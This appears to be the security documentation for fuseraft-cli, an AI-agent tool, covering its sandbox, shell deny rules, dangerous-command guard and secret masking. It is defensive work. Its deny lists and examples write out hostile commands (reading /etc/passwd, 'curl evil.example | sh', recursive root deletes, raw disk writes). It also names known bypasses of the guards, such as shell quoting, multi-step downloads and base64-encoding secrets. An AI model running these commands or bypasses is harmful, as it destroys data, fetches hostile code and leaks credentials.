# Security & Sandbox

fuseraft-cli provides two runtime containment mechanisms: a filesystem sandbox that restricts where agents can read, write, and execute, and an HTTP allowlist that restricts which hosts agents can contact. Both are enforced in code via an `IFunctionInvocationFilter` that runs before plugin functions execute.

---

## Filesystem sandbox

Set `Security.FileSystemSandboxPath` to a directory path. Every `FileSystem`, `Shell`, and `Git` plugin call that involves a path argument is checked before execution.

```yaml
Security:
  FileSystemSandboxPath: /home/user/projects/myapp
```

**`fuseraft repl` applies this automatically** — no config needed. The launch directory is used as the sandbox root by default; pass `--yolo` to disable it (along with `/hitl`'s default-on approval gate — see [`fuseraft repl`](cli-reference.md#fuseraft-repl)). `fuseraft run` has no equivalent default; `Security.FileSystemSandboxPath` must be set explicitly in the orchestration config.

### What is checked

| Plugin | Functions / Argument | Check type |
|--------|----------------------|-----------|
| `FileSystem` | `read_file`, `write_file`, `delete_file`, `list_files`, `grep_file`, `get_file_info`, `get_file_summary` — `path` / `directory` | Hard deny if resolved path is outside sandbox |
| `FileSystem` | `patch_file`, `create_directory`, `delete_directory`, `set_permissions`, `copy_file`, `move_file` | Hard deny if resolved path is outside sandbox (always enforced, regardless of whether `FileSystemPermissions` globs are configured) |
| `Shell` | `shell_run`, `shell_run_script` — `workingDirectory` | Hard deny if resolved path is outside sandbox |
| `Shell` | `shell_run`, `shell_run_script` — `command` / `script` | Best-effort scan for absolute paths escaping sandbox |
| `Git` | Every function — `repoPath` (`directory` for `git_init`) | Hard deny if resolved path is outside sandbox, including read-only queries (`git_status`, `git_log`, `git_show`, …); an unspecified `repoPath` defaults to the sandbox root |
| `Search` | `search_content`, `search_callers`, `search_symbol` — `directory` | Hard deny if resolved path is outside sandbox; an unspecified `directory` resolves against the sandbox root, not the process's working directory |

### Path resolution

All paths are resolved to their canonical absolute form (symlinks followed, `..` removed) before checking. A path is allowed if its canonical form starts with the sandbox root.

### Shell command scanning

The `command` and `script` arguments are scanned before execution. Two checks run in order:

**1. Subshell blocking** — Commands containing `$(...)`, `` `...` `` (backtick substitution), or `${VAR}` variable expansion are **unconditionally denied**. These constructs evaluate at runtime and produce values that cannot be statically verified against the sandbox root. If your workflow requires command substitution, use the `CodeExecution` plugin (Docker) instead.

**2. Absolute path scan** — The remaining command text is scanned with a regex for tokens that look like absolute paths. Matches are resolved and checked against the sandbox. System binary prefixes are **exempted** so agents can invoke normal tools without being blocked:

**Exempted prefixes (Unix):** `/usr/`, `/bin/`, `/sbin/`, `/lib/`, `/lib64/`, `/opt/`, `/nix/`, `/run/current-system/`, `/snap/`

**Exempted prefixes (Windows):** `C:\Windows\`, `C:\Program Files\`, `C:\Program Files (x86)\`

This means `/usr/bin/dotnet build src/` is allowed, but `cat /etc/passwd` is blocked.

### Limitation

Absolute-path scanning is heuristic. Shell escaping (quoting, concatenation) may bypass regex detection. **For strict containment, use the `CodeExecution` plugin (Docker) instead of `Shell`.** Docker containers run with `--network none` and are isolated from the host filesystem.

### Denial response

When a check fails, the function is never executed and the agent receives this tool result:

```
[DENIED] Path '/etc/passwd' is outside the configured sandbox '/home/user/projects/myapp'.
All file operations must stay within the sandbox.
```

For subshell constructs:

```
[DENIED] Shell command contains a command substitution or variable expansion ('$(cat /etc/passwd)')
that cannot be statically verified against the sandbox. Rewrite the command without subshells,
or use the CodeExecution plugin (Docker) for commands that require substitution.
```

The agent sees these as tool errors and can respond accordingly (typically by staying within the sandbox).

### Multi-root sessions

The REPL sandbox above confines every `FileSystem`/`Shell`/`Git`/`Search` call to a single root by default — the launch directory. `--include <dir>` (repeatable) adds more allowed roots for the same session, so an agent can work across more than one project tree at once: `fuseraft repl --include ../shared-lib --include ../other-service`. The included roots are shown in the startup banner (`Included:`) and listed for the model in its system prompt, since tools scope one directory per call and don't search across roots automatically.

A path outside every allowed root isn't only a hard deny in this case — `read_file`, `write_file`, `patch_file`, `grep_file`, `delete_file`, `get_file_info`, `get_file_summary`, `save_file_summary`, `set_permissions`, `create_directory`, `delete_directory`, `copy_file`, and `move_file` also offer a HITL prompt to grant it on the spot:

```
⏸ FileSystem action requested:
  read_file — /path/outside/file.txt is outside the current sandbox — grants
'/path/outside' for the rest of this session
Allow? (y/N):
```

Approving grants the *containing directory* of the requested path (not the single file, and not some broader ancestor) for the rest of the session — a follow-up request for a sibling file in that same directory doesn't prompt again. The grant is session-only: never written to disk, gone on `/exit`. `search_content`/`search_callers`/`search_symbol`, `list_files`/`list_directory`, and `Shell`/`Git` path checks stay hard-deny-only for now — they don't offer this on-demand prompt.

`--include` is ignored (with a warning) under `--yolo`, since there's no sandbox to add roots to.

---

## Filesystem permissions (read / write / deny globs)

`Security.FileSystemPermissions` adds per-path access control on top of the sandbox boundary. All three sub-lists use the same glob syntax as `ChangeEnvelope` and are evaluated relative to `FileSystemSandboxPath`. Requires `FileSystemSandboxPath` to be set.

```yaml
Security:
  FileSystemSandboxPath: /home/user/projects/myapp
  FileSystemPermissions:
    Read:
      - src/**
      - docs/**
    Write:
      - tests/**
      - docs/**
    Deny:
      - secrets/**
      - infra/prod/**
      - .env
```

### Evaluation order

For every filesystem function call, the three lists are checked in this order:

1. **Deny** — if the resolved path matches any `Deny` glob, the call is blocked immediately, regardless of `Read` or `Write`.
2. **Write** — if the function is a write operation and `Write` is non-empty, the path must match at least one `Write` glob to proceed.
3. **Read** — if the function is a read operation and `Read` is non-empty, the path must match at least one `Read` glob to proceed.

### Which functions are covered

| Category | Functions | Notes |
|----------|-----------|-------|
| Content-read (Read glob applies) | `read_file`, `grep_file`, `get_file_summary` | Returns file content |
| Metadata (Deny glob only, exempt from Read) | `list_files`, `list_directory`, `get_file_info` | Returns names / timestamps only, not content — use `Deny` to restrict these |
| Write ops (Write glob + envelope apply) | `write_file`, `patch_file`, `delete_file`, `create_directory`, `delete_directory`, `set_permissions` | |
| Mixed read+write (Copy/Move) | `copy_file`, `move_file` | Read glob checked on `source`; Write glob and envelope checked on `destination` |

### Interaction with ChangeEnvelope

`FileSystemPermissions.Write` and `ChangeEnvelope` are independent restrictions — **both must be satisfied** when both are configured. A write is permitted only if the path matches at least one pattern from each list.

`ChangeEnvelope` targets brownfield workflows where the Archaeologist auto-populates the list from a discovery brief. `FileSystemPermissions.Write` is the general-purpose alternative for manual configuration.

`ChangeEnvelope` applies to direct writes (`write_file`, `patch_file`, `delete_file`) and to the **destination** of copy and move operations — so copying or moving a file into a path outside the envelope is also denied.

### Denial response

```
[DENIED] 'infra/prod/deploy.sh': Path is blocked by a configured FileSystem deny rule.
[DENIED] 'src/auth/token.go': Path is outside the configured FileSystem write permissions.
```

### REPL support and the default secrets deny list

`FileSystemPermissions.Deny` is enforced in both `fuseraft run` orchestration and the REPL — the REPL loads it from `Security.FileSystemPermissions` in `.fuseraft/config/orchestration.yaml`, if that file exists, no orchestration session needs to actually run for it to apply.

Both surfaces also always deny `.env` and `.env.*` for `read_file`, `grep_file`, and `get_file_summary` — even with no `Security` config declared anywhere, and even for a sub-agent's own `FileSystem` tool set — "don't leak secrets into context" shouldn't require opting in. Any `Deny` patterns from config are merged on top of this default, never replacing it. `run_skill_script` is intentionally exempt: a vetted, path-verified skill script may still `source .env` internally (see [Skills execution trust model](#skills-execution-trust-model)) — the point is stopping the *model* from reading the file's content directly, not stopping a trusted script from using it.

---

## Shell policy

`Security.ShellPolicy` controls which shell commands agents may execute. It is enforced in the Shell plugin before execution and **does not require a filesystem sandbox** — it works even when `FileSystemSandboxPath` is not set.

```yaml
Security:
  ShellPolicy:
    Allow:
      - "go test"
      - "npm test"
      - "dotnet test"
    Deny:
      - "rm -rf"
      - "curl | bash"
      - "wget | sh"
      - "dd if="
```

### Evaluation

- **Deny is checked first.** If the command text contains any `Deny` pattern (case-insensitive substring match), the command is blocked regardless of the `Allow` list.
- **Allow is evaluated next.** When the `Allow` list is non-empty, the command must contain at least one `Allow` pattern (case-insensitive substring match) to proceed. Commands that match no allow pattern are rejected.
- When both lists are empty, the shell is unrestricted (subject to the existing `sudo` block).

Matching is substring-based so patterns are flexible:
- `"go test"` matches `go test ./...`, `go test -v ./pkg/...`, etc.
- `"rm -rf"` blocks any command containing that substring.

Before comparing, both the command and each pattern have compatibility characters folded (fullwidth letters become ASCII), invisible zero-width characters removed, line continuations (`\` + newline) joined, and runs of whitespace collapsed to one space. So a `"rm -rf"` pattern also catches `rm  -rf` (two spaces), `rm<TAB>-rf`, and `rm -rf` with an invisible zero-width character inside `rm`. Leading and trailing spaces *inside* a pattern are preserved, so `"ls "` does not become a bare `ls`.

!!! warning "Substring matching is not a sandbox"
    A substring deny list cannot enumerate every spelling of a dangerous command (`rm -fr`, `rm -r -f`, `/bin/rm -rf`, `bash -c "rm -rf /"` …), and a substring **allow** list is satisfied by any command that merely *contains* an allowed phrase — `go test; curl evil.example | sh` contains `go test`. Use the [built-in dangerous-command guard](#dangerous-command-guard) below for the catastrophic cases, and the filesystem sandbox / HITL approval for everything else.

### Applies to all shell execution

The policy is enforced in `shell_run`, `shell_run_script`, and `shell_run_background`. Commands from any of these three tools are checked against the same `ShellPolicy`.

### Denial response

```
[DENIED] Shell command blocked: matches configured deny pattern 'rm -rf'.
[DENIED] Shell command blocked: not matched by any configured allow pattern.
         Allowed: 'go test', 'npm test', 'dotnet test'.
```

### Default: `.env` always denied

Like `FileSystemPermissions.Deny` above, both the REPL and orchestration merge a built-in `.env` deny pattern into `ShellPolicy.Deny` by default — even with no `Security` config at all — so `cat .env`, `echo $(cat .env)`, and similar are blocked regardless of project configuration. Any `Deny` patterns declared in config are added on top, never replaced.

---

## Change envelope

Restricts **write** operations (`write_file`, `patch_file`, `delete_file`) to files matching at least one declared glob pattern. Read operations (`read_file`, `list_files`) are never affected. Requires `FileSystemSandboxPath` to be set — patterns are evaluated relative to the sandbox root.

```yaml
Security:
  FileSystemSandboxPath: /home/user/projects/myapp
  ChangeEnvelope:
    - src/billing/**
    - src/payments/processor.go
    - tests/billing/**
```

A write attempt outside the envelope produces:

```
[DENIED] Path 'src/auth/token.go' is outside the configured change envelope.
Only files matching the declared envelope globs may be written in this session.
Ask the Planner to expand the scope if this file needs to change.
```

**Glob syntax** — standard glob patterns using `*` (single directory level), `**` (any depth), and `?` (single character). Patterns are matched case-insensitively on Windows and case-sensitively on Unix.

**Brownfield auto-population** — when `Brownfield.SeedEnvelopeFromBrief: true` is set and a discovery brief exists at `Brownfield.DiscoveryBriefPath`, the brief's `in_scope_files` list is automatically merged into `ChangeEnvelope` at session startup. The envelope grows as the Archaeologist expands scope; it never shrinks during a session. See [Configuration → Brownfield mode](configuration.md#brownfield-mode).

**Enforcement is additive** — any pattern already in `ChangeEnvelope` at config load is retained alongside the patterns seeded from the brief.

**When no envelope is set** — all writes within the sandbox root are permitted (default behaviour).

---

## File read size limit

`read_file` returns at most `Security.ReadFileSizeLimit` characters per call (default 20,000 ≈ 5k tokens). Files larger than the limit are truncated with a notice telling the agent how to read further with `shell_run + tail`.

```yaml
Security:
  ReadFileSizeLimit: 40000   # raise to ~10k tokens per read for large-file workloads
```

Tune this when agents need to read large files in one call, or lower it to reduce per-read token cost for agents with small context windows. The limit applies globally to all agents in the session.

---

## HTTP allowlist

Set `Security.HttpAllowedHosts` to a list of permitted hostnames. If the list is non-empty, any `Http` plugin call to a hostname not on the list is denied.

```yaml
Security:
  HttpAllowedHosts:
    - api.github.com
    - registry.npmjs.org
    - pypi.org
```

Private and loopback addresses are **always blocked** regardless of the allowlist:

| Range | Blocked addresses |
|-------|-----------------|
| Loopback | `127.0.0.0/8` |
| Private class A | `10.0.0.0/8` |
| Private class B | `172.16.0.0/12` |
| Private class C | `192.168.0.0/16` |
| Link-local | `169.254.0.0/16` |
| IPv6 loopback | `::1` |
| IPv6 link-local | `fe80::/10` |

This prevents SSRF-style attacks where an agent is tricked into making requests to internal infrastructure.

An empty `HttpAllowedHosts` list means unrestricted (but private IPs are still blocked).

Entries in `HttpAllowedHosts` support `${ENV_VAR}` token expansion — the token is replaced with the environment variable's value at startup:

```yaml
Security:
  HttpAllowedHosts:
    - "${SNOW_HOST}"       # e.g. mycompany.service-now.com
    - api.github.com
```

Tokens referencing unset variables expand to an empty string. See [Configuration → ApiProfiles](configuration.md#apiprofiles) for the same expansion applied to profile header values.

### AllowPrivateHosts

Set `Security.AllowPrivateHosts: true` to bypass the private/loopback IP check. This allows agents to reach locally-running servers such as a mock API or a development service.

```yaml
Security:
  AllowPrivateHosts: true
  HttpAllowedHosts:
    - localhost
    - "127.0.0.1"
```

**Do not set this in production configs.** It is intended exclusively for local development and sandbox environments where agents must contact a server running on the same machine. The `HttpAllowedHosts` allowlist is still enforced when set — `AllowPrivateHosts` only disables the private-IP range check, not the host allowlist.

---

## Combining both

```yaml
Security:
  FileSystemSandboxPath: /home/user/projects/myapp
  HttpAllowedHosts:
    - api.github.com
```

Agents are now constrained to:
- Reading and writing files only within `/home/user/projects/myapp`
- Making HTTP requests only to `api.github.com`

---

## Docker containment (CodeExecution plugin)

For the highest isolation, use the `CodeExecution` plugin's `sandbox_run` instead of `Shell`. Each invocation gets a fresh Docker container:

- `--network none` — no network access
- `--memory 256m` — memory capped
- `--cpus 0.5` — CPU capped
- Container is removed after execution

```yaml
Plugins:
  - CodeExecution
```

```
sandbox_run(language="python", code="import os; print(os.listdir('/'))")
```

This gives a fully isolated execution environment regardless of what the `FileSystemSandboxPath` is set to.

---

## Execution rings

When `Security.FileSystemSandboxPath` is configured, each agent is placed in an execution ring based on its `TrustScore`. Rings layer on top of the path-level sandbox to control which *operations* the agent may perform within those paths.

| Ring | TrustScore | Writes allowed | Shell allowed |
|------|-----------|----------------|---------------|
| Ring 1 (Trusted) | ≥ 0.80 | yes | yes |
| Ring 2 (Standard) | ≥ 0.60 | yes | yes |
| Ring 3 (Sandbox) | < 0.60 | **no** | **no** |

Ring 3 agents can read files and list directories but are blocked from writing, deleting, running shell commands, or making network requests. This is useful for review-only agents or auditors that should not be able to modify state.

```yaml
- Name: Auditor
  TrustScore: 0.5
  Plugins:
    - FileSystem
```

See [Governance — Execution rings](governance.md#execution-rings) for details.

---

## Dangerous-command guard

Beyond `sudo`, the Shell plugin unconditionally blocks the few commands that are never a legitimate thing for an agent to run unattended. Unlike a `ShellPolicy.Deny` substring, the check parses the command — quoting, escapes, pipelines, `;` `&&` `||`, sub-shells, `env`/`nice`/`timeout`/`command` wrappers, and `sh -c` / `eval` arguments (a few levels deep) — so it is not defeated by flag order, extra whitespace, a path-qualified binary, or a quoted command name. It applies to `shell_run`, `shell_run_script`, and `shell_run_background`, needs no configuration, and — like `sudo` — is **not** lifted by `--yolo` or an empty `ShellPolicy`.

| Rule | Blocks | Examples |
|------|--------|----------|
| `catastrophic-delete` | A recursive delete of `/`, `~`, `$HOME`, your literal home directory, or a top-level system directory (`/etc`, `/usr`, `/var`, `/home`, …); or an unfiltered `find <those> -delete`. | `rm -rf /`, `rm -fr ~/`, `rm -r -f "$HOME"`, `/bin/rm -rf /etc/*`, `bash -c 'rm -rf /'`, `find / -delete` |
| `raw-disk-op` | Formatting a filesystem or writing straight to a block device. | `mkfs.ext4 /dev/sda1`, `dd if=x of=/dev/nvme0n1`, `cat img > /dev/sdb`, `wipefs -a /dev/sda` |
| `fetch-to-exec` | Downloading and executing in one step. | `curl … \| sh`, `wget -qO- … \| bash -s`, `bash <(curl …)`, `sh -c "$(curl …)"`, `eval "$(curl …)"` |

The agent receives, for example:

```
[DENIED] Shell command blocked: it recursively deletes a system or home directory (catastrophic-delete).
Use a narrower, targeted command instead. If this is genuinely what is needed, tell the user
exactly which command to run and they will run it themselves.
```

The guard is deliberately precise, because a hit is a hard deny. Ordinary work is untouched: `rm -rf build/`, `rm -rf /tmp/*`, `rm -rf $HOME/project/build`, `find ~ -name '*.pyc' -delete`, `dd if=a of=b`, `curl … \| jq .`, and `curl … \| python3 -c '…'` (where the download is *data* for the interpreter, not the script) all run normally. Text that is only ever *written* — a heredoc body, a comment, a quoted `echo` argument — is not treated as a command.

!!! note "What it does not catch"
    The guard is static and understands POSIX-shell syntax only (no `cmd.exe` / PowerShell rules). Variables, shell functions, `xargs`, and multi-step sequences such as `curl -o x.sh … && sh x.sh` can still get past it. Treat it as a guardrail beside the sandbox and HITL approval, not a replacement for them.

---

## `sudo` protection

`sudo` is unconditionally blocked in the Shell plugin. Any command or script containing `sudo` — including in pipe chains (`cmd && sudo apt install ...`), semicolon sequences, or multi-line scripts — is caught before execution and the agent receives:

```
[DENIED] sudo is not permitted. Prefer non-privileged alternatives: pip install --user,
python -m pip install --user, pipx, or a virtual environment
(python -m venv .venv && .venv/bin/pip install ...).
If elevated privileges are truly required, tell the user exactly which command to run
and they will run it themselves.
```

This keeps privilege escalation out of the automated loop. If elevated access is genuinely needed, the agent surfaces the command to the user to run manually.

---

## Prompt injection detection

Tool results are scanned for adversarial instruction overrides before they are passed to the agent. If a `shell_run` or `read_file` result looks like it is trying to override the agent's instructions, the content is flagged and the event is recorded in the [audit log](governance.md#audit-log).

Detection is automatic — no configuration required.

---

## API key storage

When you configure the REPL via the first-run wizard or `/provider setup`, the API key is stored in the OS-native credential store — never in `~/.fuseraft/config` on disk.

**Updating or rotating a key.** When a key expires or you need to swap it out, either run `/provider setup` in the REPL (reconfigures provider/model/key interactively and rebuilds the session's chat client immediately), or outside the REPL:

```bash
export FUSERAFT_API_KEY=sk-...new-key...
fuseraft keychain --set
```

`fuseraft keychain --set` overwrites whatever's currently in the keychain — see [CLI Reference — `fuseraft keychain`](cli-reference.md#fuseraft-keychain) for `--get` and the no-flag status check. `fuseraft settings set provider.apiKey` is deliberately not a valid way to do this — it's refused outright, pointing back to one of these two paths, so a key never ends up written to the config file even by accident.

### Secret masking in logs

All log output (console, `~/.fuseraft/logs/app.log`, and any debug sidecar file) passes through a secret-masking text formatter before being written. The formatter applies three regex patterns:

| Pattern | Example match | Replaced with |
|---------|--------------|---------------|
| `sk-[A-Za-z0-9_-]{20,}` | `sk-ant-api03-abc123…` | `[REDACTED]` |
| `(?i)bearer <token>` | `Bearer eyJhbGc…` | `[REDACTED]` |
| `(?i)(api_key\|token\|secret)=<value>` | `api_key=supersecret` | `[REDACTED]` |

This means even if a provider error response or debug trace contains an API key, it is stripped before reaching any log sink. No configuration is required — masking is always active.

### Secret values in tool output

Shell children inherit fuseraft's environment, so `env`, `printenv`, `echo $GITHUB_TOKEN`, or a verbose CLI would otherwise hand a live credential to the model — and from there to the provider request and the saved session log. To prevent that, the values of **secret-looking environment variables** are replaced with `<secret-hidden>` in everything the Shell and Git plugins return (`shell_run`, `shell_run_script`, `shell_get_job_status`, `shell_get_job_output`, and every `git_*` result), and `shell_get_env` returns `<secret-hidden>` for such a variable instead of its value.

A variable counts as secret-looking when its name ends in, or contains as an `_`-delimited word, one of `KEY`, `API_KEY`, `ACCESS_KEY`, `SECRET_KEY`, `PRIVATE_KEY`, `TOKEN`, `SECRET`, `PASSWORD`, `PASSWD`, `PASSPHRASE`, `CREDENTIAL(S)`, or `CONNECTION_STRING` (plus `MYSQL_PWD`) — so `ANTHROPIC_API_KEY`, `GITHUB_TOKEN`, `AWS_SECRET_ACCESS_KEY`, and `PGPASSWORD` match, while `PATH`, `SSH_AUTH_SOCK`, and `KEYBOARD_LAYOUT` do not. Names that point *to* a secret rather than hold one (`AWS_ACCESS_KEY_ID`, `GITHUB_TOKEN_FILE`, `TOKEN_URL`, `SSH_KEY_PATH`) are left alone. Values shorter than 8 characters are not masked in output, to avoid mangling ordinary words such as `true`.

The agent never needs the value itself: a command can reference `$NAME` and the shell expands it. The environment is re-read on every call, so a variable added with `shell_set_env` mid-session is covered too.

!!! note "Limitations"
    This is exact-value masking. It stops accidental exposure, not a model that deliberately re-encodes a secret (`echo $KEY | base64`). It only knows about variables in the process environment, and it applies to tool output — not to the `!<command>` REPL escape, which is yours, not the agent's. For the adversarial case use the filesystem sandbox and HITL approval.

| Platform | Store | Mechanism |
|----------|-------|-----------|
| Linux | GNOME Keyring | `secret-tool` CLI (libsecret); service=`fuseraft-cli`, account=`default` |
| macOS | Keychain | `security` CLI; service=`fuseraft-cli`, account=`default` |
| Windows | Credential Manager | Win32 `CredRead`/`CredWrite` via P/Invoke; target=`fuseraft-cli/default`. Works in Git Bash and any other shell. |

**No plaintext fallback.** fuseraft never writes API keys to disk in plaintext, on any platform, under any circumstances. If no OS keychain is reachable (e.g. Linux without a running secret service), key storage fails with a clear message and the key is kept in memory for the current process only — you'll need to re-enter it next session, or set a provider environment variable (e.g. `ANTHROPIC_API_KEY`) so you don't have to. On startup, fuseraft also deletes (and, where possible, migrates into the keychain) any leftover `~/.fuseraft/.key` file written by fuseraft versions older than this policy.

`~/.fuseraft/config`'s `provider` section stores only the model ID, provider URL, and provider type — no secrets. Its other sections (sampling, REPL, and telemetry defaults; MCP server connection details; skill-curation settings) are likewise plain, non-secret settings. If you open the file you will see:

```json
{
  "provider": {
    "modelId": "claude-sonnet-4-6",
    "endpoint": "https://api.anthropic.com",
    "type": "anthropic"
  }
}
```

(Other sections are omitted here for brevity — see [CLI Reference — `fuseraft settings`](cli-reference.md#fuseraft-settings) for the full shape, or run `fuseraft settings show`.)

**Migration from older configs.** Configs written before keychain support was added may contain a plain-text `apiKey` field, and versions predating the no-plaintext policy may have left a `~/.fuseraft/.key` file on disk. On the first run after upgrading, fuseraft detects both, attempts to move the value into the OS keychain, and removes the plaintext copies either way — even if no keychain is available to migrate into. No manual action is needed. Separately, a config written before this file was sectioned (a flat object, without the `provider`/`sampling`/etc. structure above) is rewritten into the new shape the same way, on the same first run — see [`fuseraft settings` — Migrating from the old flat config](cli-reference.md#migrating-from-the-old-flat-config).

**Using an environment variable instead.** Setting a provider env var (e.g. `ANTHROPIC_API_KEY`) always works as a fallback. The env var is used when no `~/.fuseraft/config` exists or when the keychain has no entry for `fuseraft-cli`.

**VS Code extension.** When the fuseraft VS Code extension invokes the CLI it always passes `--vscode`. In this mode the CLI reads the API key from the `FUSERAFT_API_KEY` environment variable rather than the OS keychain. The extension stores the key in VS Code's built-in `SecretStorage` (backed by the OS credential store) and injects it into every terminal it opens. No manual configuration is needed — set your key once via **fuseraft: Configure fuseraft** and it is available to all commands run through the extension.

**Relocating `~/.fuseraft` (`FUSERAFT_HOME`).** Setting `FUSERAFT_HOME` moves the entire global root — config, sessions, logs, scratchpad, skills, memory — to the given directory (see [Getting Started — Relocating `~/.fuseraft`](getting-started.md#relocating-fuseraft)). This never includes the API key: OS keychains are local to the machine they run on and do not follow a redirected `FUSERAFT_HOME` to a network share, and fuseraft will not write the key to the share as a plaintext file instead (see "No plaintext fallback" above). On a machine with no reachable keychain, set a provider environment variable (e.g. `ANTHROPIC_API_KEY`) rather than relying on persisted key storage.

---

## Crash dumps

When the application exits with an unhandled exception, a structured JSON report is written to `~/.fuseraft/crashdump/` before the process terminates. Each file is named with a timestamp and a random short ID:

```
~/.fuseraft/crashdump/20260422-153012-a3f1b2c4.json
```

The path is printed to the console immediately after the exception so you can locate it without searching.

**What is captured**

| Field | Description |
|-------|-------------|
| `session_id` | Unique ID for this crash instance (matches the filename) |
| `timestamp` | UTC ISO 8601 timestamp |
| `command` | Command-line arguments supplied to the process |
| `os` | Operating system description |
| `runtime` | .NET framework description |
| `app_version` | fuseraft-cli version (semver + git hash) |
| `exception` | Exception type, message, and stack trace; inner exceptions are included recursively; `AggregateException` lists all inner exceptions |

**What is NOT captured**

- API keys (never written to disk outside the OS keychain)
- Session content (task text, agent messages, LLM responses)
- File contents or shell output

A dump is written only for genuine crashes. Normal exits, user cancellation (Ctrl+C), and command-line usage errors do not produce one.

---

## Skills execution trust model

Skills loaded from `~/.fuseraft/skills/`, `~/.agents/skills/`, or the built-in `<binary>/skills/` directory are operator-controlled and treated as trusted. Scripts bundled in those skills execute as OS subprocesses and inherit the process environment, including any API keys in env vars.

Project-scoped skills — loaded from `<cwd>/.fuseraft/skills/` and `<cwd>/.agents/skills/` — carry additional risk: **they travel with the repository**. A repo checked out from an untrusted source may contain a `.agents/skills/` directory with malicious scripts. Those scripts are auto-discovered and advertised to agents at session start, with no prompt to the user.

### Risk: untrusted project skills

If `fuseraft run --work-dir` points at a directory you did not author, any skill scripts in that directory will be available for agents to execute. Because script execution inherits the process environment, a malicious script can read API keys, tokens, and other credentials available as env vars.

**Mitigations:**

- Only run `fuseraft` in working directories you trust. Treat `.agents/skills/` and `.fuseraft/skills/` in a cloned repo the same way you would treat a `Makefile` or `package.json` postinstall script.
- For higher assurance, run fuseraft inside a Docker container (`CodeExecution` plugin) where the host environment is not exposed.
- Microsoft Agent Framework's skills provider supports gating `load_skill`/`read_skill_resource`/`run_skill_script` behind an approval step (`AgentSkillsProviderOptions`), but fuseraft explicitly disables it today, since neither the REPL nor orchestration has a pipeline that resolves an approval request — leaving it enabled would make the tools non-functional rather than gated. Script execution is therefore automatic once a skill is loaded; wiring real approval (REPL: a confirmation prompt; orchestration: `IHumanApprovalService`) is a known future improvement, not yet implemented.
- `read_skill_resource` and `run_skill_script` resolve the model-supplied path against the skill directory and reject anything that resolves outside it, including via a symlinked file or subdirectory planted inside the skill folder — this narrows path-based escape from *within* a loaded skill, but a fully malicious skill script still runs as an OS subprocess with the full process environment; it isn't a substitute for only loading trusted skills.

---

## Security notes

- The path sandbox and ring system are enforced at the agent middleware layer, not at the OS level. A compromised plugin bypass (e.g. a malicious MCP server) could potentially circumvent them.
- For production use with untrusted tasks, run fuseraft-cli inside a container or VM rather than relying solely on the sandbox config.
- Session files in `~/.fuseraft/sessions/` are written with owner-only permissions (Unix mode 0600) to prevent other users from reading session content.
- See [Governance](governance.md) for the full set of runtime safety controls.
